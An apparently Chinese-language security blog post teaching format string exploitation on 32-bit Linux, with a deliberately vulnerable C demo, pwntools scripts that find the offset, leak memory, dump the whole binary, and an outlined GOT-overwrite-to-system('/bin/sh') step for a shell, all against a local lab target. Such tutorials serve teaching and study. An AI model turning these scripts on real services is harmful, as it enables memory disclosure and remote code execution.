@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Linux系统下格式化字符串利用研究 | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux系统下格式化字符串利用研究">
+<meta property="og:url" content="http://0x48.pw/2017/03/13/0x2c/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究">
+<meta property="og:image" content="http://qn.lazysheep.cc/img/format1.png">
+<meta property="og:updated_time" content="2017-03-14T05:22:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux系统下格式化字符串利用研究">
+<meta name="twitter:description" content="格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究">
+<meta name="twitter:image" content="http://qn.lazysheep.cc/img/format1.png">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Binary/" style="font-size: 16px;">Binary</a> <a href="/tags/CBC-Padding-Oracle-Attack/" style="font-size: 10px;">CBC Padding Oracle Attack</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 18px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Old博文/" style="font-size: 10px;">Old博文</a> <a href="/tags/PWN/" style="font-size: 14px;">PWN</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 14px;">Python</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/Re/" style="font-size: 10px;">Re</a> <a href="/tags/SHA1-Length-Extension-Attack/" style="font-size: 10px;">SHA1 Length Extension Attack</a> <a href="/tags/SQLi/" style="font-size: 12px;">SQLi</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/Wechall/" style="font-size: 10px;">Wechall</a> <a href="/tags/php/" style="font-size: 14px;">php</a> <a href="/tags/安全研究/" style="font-size: 12px;">安全研究</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/检讨/" style="font-size: 10px;">检讨</a> <a href="/tags/环境搭建/" style="font-size: 10px;">环境搭建</a> <a href="/tags/网络/" style="font-size: 10px;">网络</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x2c" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/03/13/0x2c/" class="article-date">
+      <time datetime="2017-03-13T07:39:33.000Z" itemprop="datePublished">2017-03-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux系统下格式化字符串利用研究
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/H-blog/">H-blog</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究</p>
+<a id="more"></a>
+<p>格式化字符串危害最大的就两点, 一点是leak memory, 一点就是可以在内存中写入数据, 简单来说就是格式化字符串可以进行内存地址的读写.</p>
+<h1 id="Leak-Memory"><a href="#Leak-Memory" class="headerlink" title="Leak Memory"></a>Leak Memory</h1><p>先来对一个简单的Demo进行研究:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># fmt_test.<span class="function">c</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> a[<span class="number">1024</span>];</div><div class="line">	<span class="built_in">memset</span>(a, <span class="string">'\0'</span>, <span class="number">1024</span>);</div><div class="line">	read(<span class="number">0</span>, a, <span class="number">1024</span>);</div><div class="line">	<span class="built_in">printf</span>(a);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"># $ gcc fmt_test.c -o fmt_test -m32</div><div class="line"># $ socat TCP4-LISTEN:<span class="number">10001</span>,fork EXEC:./fmt_test</div></pre></td></tr></table></figure></p>
+<p>假设我们不知道该程序的源码，连bin都没有，只是能访问一个这样的应用:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">aaaaaaa</div><div class="line">aaaaaaa</div></pre></td></tr></table></figure></p>
+<p>在这种情况下，就是去尝试各种漏洞的攻击方法，比如栈溢出漏洞就输入一堆字符，比如<code>100*&quot;a&quot;</code>，而格式化字符串漏洞是使用”%x”这类格式化字符串去尝试，比如:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">%x</div><div class="line"><span class="number">2</span>c51cce0</div></pre></td></tr></table></figure></p>
+<p>得到了这样的返回就说明该应用存在格式化字符串漏洞了，因为没有源代码或bin，并不知道要往哪写啥数据，所以我们可以先leak memory，获取该应用的源码</p>
+<p>leak memory利用到的是<code>%s</code>格式化字符，它的作用是输出对应参数指向地址的值，也就是说它对应的参数是一个指针，而我们可以得到该指针对应内存数据</p>
+<p>我们还可以继续改进该格式化字符，<code>%2$s</code>，它表示的意义是输出第二个参数指向的内存的值</p>
+<p>那么我们怎么通过上面的格式化字符获取我们想要的内存的地址呢？这就涉及第三个知识点。</p>
+<p>格式化字符串漏洞是怎么产生的？首先要有一个函数，比如<code>read</code>, 比如<code>gets</code>获取用户输入的数据储存到局部变量中，然后直接把该变量作为<code>printf</code>这类函数的第一个参数值</p>
+<p>其中局部变量是储存在栈中，而且是储存在栈的高位地址上，这里具体细节可以去读读汇编代码，简单的说，进入到一个函数中后，会<code>sub rsp,xxx</code>一段局部变量的栈空间，然后函数的参数啥的都是push到局部变量的栈空间之上</p>
+<p>理解了上述的知识点后，我们可以输入想leak数据的内存地址，然后爆破出我们输入数据的位置，不就能leak相应地址的内存的数据了么</p>
+<p>比如我输入<code>ABCD%2$x</code>，如果输出<code>ABCD</code>十六进制值，则说明第二个参数为我们输入的数据的起始位置.</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">ABCD%<span class="number">2</span>$x</div><div class="line">ABCD400</div><div class="line"></div><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">ABCD%<span class="number">3</span>$x</div><div class="line">ABCD174</div><div class="line"></div><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">ABCD%<span class="number">4</span>$x</div><div class="line">ABCD174</div><div class="line"></div><div class="line">....</div><div class="line"></div><div class="line">$ nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">10001</span></div><div class="line">ABCD%<span class="number">11</span>$x</div><div class="line">ABCD44434241</div></pre></td></tr></table></figure>
+<p>这样我们就能得到payload: <code>addr + %11$s</code>, 返回值为<code>addr</code>指向的内存的字符串，直到<code>\0</code>为止</p>
+<p>这里我们可以进行测试下(我们现在是处于研究状态，虽然假想没bin，但实际我们是有的，所以可以进行测试来证明我们的结论)</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ objdum -d fmt_test -M intel</div><div class="line"></div><div class="line">....</div><div class="line"></div><div class="line"><span class="number">080485</span><span class="keyword">c</span><span class="number">4</span> &lt;_fini&gt;:</div><div class="line"> <span class="number">80485</span><span class="keyword">c</span><span class="number">4</span>:	<span class="number">53</span>                   	push   ebx</div><div class="line"> <span class="number">80485</span><span class="keyword">c</span><span class="number">5</span>:	<span class="number">83</span> ec <span class="number">08</span>             	<span class="keyword">sub</span>    esp,<span class="number">0x8</span></div><div class="line"> <span class="number">80485</span><span class="keyword">c</span><span class="number">8</span>:	e<span class="number">8</span> <span class="number">33</span> fe ff ff       	<span class="keyword">call</span>   <span class="number">8048400</span> &lt;__x<span class="number">86</span>.get_pc_thunk.bx&gt;</div><div class="line"> <span class="number">80485</span>cd:	<span class="number">81</span> <span class="keyword">c</span><span class="number">3</span> <span class="number">33</span> <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>    	<span class="keyword">add</span>    ebx,<span class="number">0x1a33</span></div><div class="line"> <span class="number">80485</span>d<span class="number">3</span>:	<span class="number">83</span> <span class="keyword">c</span><span class="number">4</span> <span class="number">08</span>             	<span class="keyword">add</span>    esp,<span class="number">0x8</span></div><div class="line"> <span class="number">80485</span>d<span class="number">6</span>:	<span class="number">5</span>b                   	pop    ebx</div><div class="line"> <span class="number">80485</span>d<span class="number">7</span>:	<span class="keyword">c</span><span class="number">3</span>                   	<span class="keyword">ret</span></div><div class="line"></div><div class="line">$ py</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line"></div><div class="line">&gt;&gt;&gt; p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</div><div class="line">[<span class="keyword">x</span>] Opening connection <span class="keyword">to</span> <span class="number">127.0</span>.<span class="number">0.1</span> on port <span class="number">10001</span></div><div class="line">[<span class="keyword">x</span>] Opening connection <span class="keyword">to</span> <span class="number">127.0</span>.<span class="number">0.1</span> on port <span class="number">10001</span>: Trying <span class="number">127.0</span>.<span class="number">0.1</span></div><div class="line">[+] Opening connection <span class="keyword">to</span> <span class="number">127.0</span>.<span class="number">0.1</span> on port <span class="number">10001</span>: Done</div><div class="line"></div><div class="line">&gt;&gt;&gt; p.send(p<span class="number">32</span>(<span class="number">0x80485c4</span>)+<span class="string">"%11$s"</span>)</div><div class="line"></div><div class="line">&gt;&gt;&gt; p.recv()</div><div class="line">'\xc<span class="number">4</span>\<span class="keyword">x</span><span class="number">85</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span>S\<span class="keyword">x</span><span class="number">83</span>\xec\<span class="keyword">x</span><span class="number">08</span>\xe<span class="number">83</span>\xfe\xff\xff\<span class="keyword">x</span><span class="number">81</span>\xc<span class="number">33</span>\<span class="keyword">x</span><span class="number">1</span>a'</div><div class="line"></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
+<p>从上面的测试代码中可以证明上述所讲的结论, 我们成功leak出相应内存的数据(直到<code>\x00</code>为止)</p>
+<p>上面爆破出来的11我们称为offset，pwntools有自动化代码可以算出offset:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># fmt_test.py</span></div><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(<span class="string">"a.out"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	info = p.recv()</div><div class="line">	p.close()</div><div class="line">	<span class="keyword">return</span> info</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="keyword">print</span> autofmt.offset</div></pre></td></tr></table></figure></p>
+<p>我们可以看看其中一条DEBUG数据和结果:<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ python fmt_test.py</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">[+] <span class="symbol">Starting</span> local process <span class="string">'./a.out'</span> argv=[<span class="string">'a.out'</span>] : <span class="symbol">Done</span></div><div class="line">[<span class="symbol">DEBUG</span>] <span class="symbol">Sent</span> <span class="number">0x22</span> bytes:</div><div class="line">    <span class="string">'aaaabaaacaaadaaaeaaaSTART%11$pEND\n'</span></div><div class="line">[<span class="symbol">DEBUG</span>] <span class="symbol">Received</span> <span class="number">0x27</span> bytes:</div><div class="line">    <span class="string">'aaaabaaacaaadaaaeaaaSTART0x61616161END\n'</span></div><div class="line">[*] <span class="symbol">Stopped</span> program <span class="string">'./a.out'</span></div><div class="line">[*] <span class="symbol">Found</span> format string offset: <span class="number">11</span></div><div class="line"><span class="number">11</span></div></pre></td></tr></table></figure></p>
+<p>测试完了，现在又恢复到没bin状态，有了前面的基础，要dump出整个bin就很容易了</p>
+<p>在Linux下，不开PIE保护时，32位的ELF的默认首地址为<code>0x8048000</code>，如果开启了PIE保护，则需要根据ELF的魔术头<code>7f 45 4c 46</code>进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止</p>
+<p>但是这时候还存在一个问题:<br>比如我的Payload为:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span> = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</div><div class="line"><span class="selector-tag">p</span>.send(p32(<span class="number">0</span>x8048000)+<span class="string">"%11$s"</span>)</div><div class="line">print <span class="selector-tag">p</span>.recv()</div></pre></td></tr></table></figure></p>
+<p>得到的结果是<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ <span class="keyword">python</span> fmt_test.<span class="keyword">py</span></div><div class="line">...</div><div class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</div><div class="line">  ...</div><div class="line">EOFError</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>发生了EOFError, 这是因为<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; p<span class="number">32</span>(<span class="number">0x8048000</span>)</div><div class="line">'\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">04</span>\<span class="keyword">x</span><span class="number">08</span>'</div></pre></td></tr></table></figure></p>
+<p><code>printf</code> 根据<code>\x00</code>判断结尾</p>
+<p>所以我们需要更改下payload<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">p = remote(<span class="string">"127.0.0.1"</span>,<span class="number">10001</span>)</div><div class="line">p.send(<span class="string">"%13$saaa"</span> + p32(<span class="number">0x8048000</span>))</div><div class="line"><span class="built_in">print</span> p.recv()</div></pre></td></tr></table></figure></p>
+<p>可以成功dump数据了:<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python fmt_test.py</div><div class="line">[+] Starting local process './a.out' argv=['a.out'] : Done</div><div class="line">[DEBUG] Sent 0xc bytes:</div><div class="line">   <span class="number"> 00000000 </span><span class="number"> 25 </span>31<span class="number"> 33 </span>24 <span class="number"> 73 </span>61<span class="number"> 61 </span>61 <span class="number"> 00 </span>80<span class="number"> 04 </span>08               │%13$│saaa│····││</div><div class="line">    0000000c</div><div class="line">[DEBUG] Received 0xa bytes:</div><div class="line">   <span class="number"> 00000000 </span> 7f<span class="number"> 45 </span>4c<span class="number"> 46 </span><span class="number"> 01 </span>01<span class="number"> 01 </span>61 <span class="number"> 61 </span>61                     │·ELF│···a│aa│</div><div class="line">    0000000a</div></pre></td></tr></table></figure></p>
+<p>原理都懂了，可以写payload去dump 整个bin回来了<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line">f = <span class="built_in">open</span>(<span class="string">"source.bin"</span>, <span class="string">"ab+"</span>)</div><div class="line"></div><div class="line">begin = <span class="number">0x8048000</span></div><div class="line"><span class="built_in">offset</span> = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> True:</div><div class="line">	addr = begin + <span class="built_in">offset</span></div><div class="line">	p = <span class="built_in">process</span>(<span class="string">"a.out"</span>)</div><div class="line">	p.sendline(<span class="string">"%13$saaa"</span> + p32(addr))</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		info = p.recvuntil(<span class="string">"aaa"</span>)[:<span class="number">-3</span>]</div><div class="line">	except EOFError:</div><div class="line">		print <span class="built_in">offset</span></div><div class="line">		break</div><div class="line">	info += <span class="string">"\x00"</span></div><div class="line">	p.<span class="built_in">close</span>()</div><div class="line">	<span class="built_in">offset</span> += <span class="built_in">len</span>(info)</div><div class="line">	f.<span class="built_in">write</span>(info)</div><div class="line">	f.flush()</div><div class="line"></div><div class="line">f.<span class="built_in">close</span>()</div></pre></td></tr></table></figure></p>
+<p>内存数据dump下来后，虽然跟原始bin有很大不同，也运行不了，但是丢到ida中任然是可以看的:</p>
+<p><img src="http://qn.lazysheep.cc/img/format1.png" alt="format1"></p>
+<h1 id="Write"><a href="#Write" class="headerlink" title="Write"></a>Write</h1><p>二进制漏洞的最终目的都是要getshell，所以在我们获取到bin后，接下来就是要getshell了</p>
+<p>不过之前的demo过于简单，没有什么好的getshell的方法，对demo进行下修改.<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># fmt_test2.c</span></div><div class="line"><span class="meta">#include &lt;stdio.h&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> a[<span class="number">1024</span>];</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) </div><div class="line">	&#123;</div><div class="line">		memset(a, <span class="string">'\0'</span>, <span class="number">1024</span>);</div><div class="line">		read(<span class="number">0</span>, a, <span class="number">1024</span>);</div><div class="line">		printf(a);</div><div class="line">		fflush(<span class="keyword">stdout</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta"># $ gcc fmt_test2.c -o fmt_test2 -m32</span></div><div class="line"><span class="meta"># $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test2</span></div></pre></td></tr></table></figure></p>
+<p>和之前的demo比，多了循环，不像之前一样一下就退出了</p>
+<p>在这种情况下，我们可以很容易只依靠格式化字符串漏洞进行攻击</p>
+<p>利用的逻辑很简单，根据之前的知识点，leak出bin，然后获取到<code>printf</code>函数的got表地址，然后把这个地址的值改为<code>system</code>函数的地址，在下次循环的时候，输入<code>/bin/sh</code>，则<code>printf(a);</code>实际执行的却是<code>system(&#39;/bin/sh&#39;)</code></p>
